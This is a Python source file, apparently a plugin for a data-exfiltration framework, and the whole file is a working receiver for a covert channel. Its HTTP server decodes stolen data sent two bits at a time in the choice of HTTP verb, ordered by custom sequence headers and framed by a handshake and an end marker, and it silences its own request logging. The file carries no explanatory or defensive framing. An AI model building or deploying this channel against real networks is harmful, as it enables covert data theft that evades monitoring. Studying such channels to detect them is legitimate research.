from __future__ import annotations
from typing import Dict, Any, Iterable, Iterator
import threading, time
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

from tfg.plugins.api import ExfilServerPlugin

BITS_MAP = {"GET": 0b00, "POST": 0b01, "PUT": 0b10, "DELETE": 0b11}


class _VerbStore:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._symbols:     dict[str, dict[int, int]] = {}  # exfil_id -> {seq: bits}
        self._total_bytes: dict[str, int]            = {}
        self._done:        dict[str, bool]           = {}
        self._started:     dict[str, bool]           = {}

    def init_transfer(self, exfil_id: str, total_bytes: int) -> None:
        with self._lock:
            if exfil_id not in self._started:
                self._symbols[exfil_id]     = {}
                self._total_bytes[exfil_id] = total_bytes
                self._done[exfil_id]        = False
                self._started[exfil_id]     = True

    def push_symbol(self, exfil_id: str, seq: int, bits: int) -> None:
        with self._lock:
            if exfil_id not in self._symbols:
                self._symbols[exfil_id]     = {}
                self._total_bytes[exfil_id] = 0
                self._done[exfil_id]        = False
                self._started[exfil_id]     = False
            self._symbols[exfil_id][seq] = bits

    def mark_done(self, exfil_id: str) -> None:
        with self._lock:
            self._done[exfil_id] = True

    def is_done(self, exfil_id: str) -> bool:
        with self._lock:
            return self._done.get(exfil_id, False)

    def reconstruct(self, exfil_id: str) -> bytes:
        with self._lock:
            symbols     = self._symbols.get(exfil_id, {})
            total_bytes = self._total_bytes.get(exfil_id, 0)

        sorted_bits = [symbols[k] for k in sorted(symbols.keys())]

        result = bytearray()
        for i in range(0, len(sorted_bits), 4):
            group = sorted_bits[i:i + 4]
            if len(group) < 4:
                group += [0] * (4 - len(group))
            byte_val = (group[0] << 6) | (group[1] << 4) | (group[2] << 2) | group[3]
            result.append(byte_val)

        # Truncar al total real de bytes para descartar padding
        return bytes(result[:total_bytes]) if total_bytes else bytes(result)

    def pop_iter(self, exfil_id: str) -> Iterator[bytes]:
        while not self.is_done(exfil_id):
            time.sleep(0.05)
        # Margen para que lleguen los últimos símbolos en vuelo
        time.sleep(0.1)
        yield self.reconstruct(exfil_id)


def _make_handler(store: _VerbStore, path: str, auth_token: str | None):
    class H(BaseHTTPRequestHandler):
        def do_GET(self):    self._handle("GET")
        def do_POST(self):   self._handle("POST")
        def do_PUT(self):    self._handle("PUT")
        def do_DELETE(self): self._handle("DELETE")
        def do_HEAD(self):   self._handle("HEAD")

        def _handle(self, method: str) -> None:
            if self.path != path:
                self.send_response(404); self.end_headers(); return
            if auth_token and self.headers.get("X-Auth-Token") != auth_token:
                self.send_response(401); self.end_headers(); return

            exfil_id = self.headers.get("X-Exfil-Id") or "default"

            # Handshake de inicio
            if method == "HEAD" and self.headers.get("X-Exfil-Start") == "1":
                total = int(self.headers.get("X-Exfil-Bytes") or "0")
                store.init_transfer(exfil_id, total)
                self.send_response(200); self.end_headers()
                return

            # EOT
            if self.headers.get("X-Exfil-Last") == "1":
                store.mark_done(exfil_id)
                self.send_response(200); self.end_headers()
                return

            # Símbolo de datos
            if method in BITS_MAP:
                seq  = int(self.headers.get("X-Exfil-Seq") or "0")
                bits = BITS_MAP[method]
                store.push_symbol(exfil_id, seq, bits)

            self.send_response(200); self.end_headers()

        def log_message(self, fmt, *args):  # silencia logs de consola
            pass

    return H


class HttpServerVerbSeq(ExfilServerPlugin):
    canal  = "HTTP"
    metodo = 2
    name   = "http_server_verb_seq"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        bind_host  = config.get("bind_host") or "0.0.0.0"
        bind_port  = int(config.get("bind_port") or 8080)
        path       = config.get("path") or "/upload"
        exfil_id   = config.get("exfil_id") or "default"
        auth_token = config.get("auth_token")

        store   = _VerbStore()
        Handler = _make_handler(store, path, auth_token)
        httpd   = ThreadingHTTPServer((bind_host, bind_port), Handler)
        th      = threading.Thread(target=httpd.serve_forever, daemon=True)
        th.start()

        def _gen() -> Iterator[bytes]:
            try:
                for chunk in store.pop_iter(exfil_id):
                    yield chunk
            finally:
                httpd.shutdown()

        return _gen()
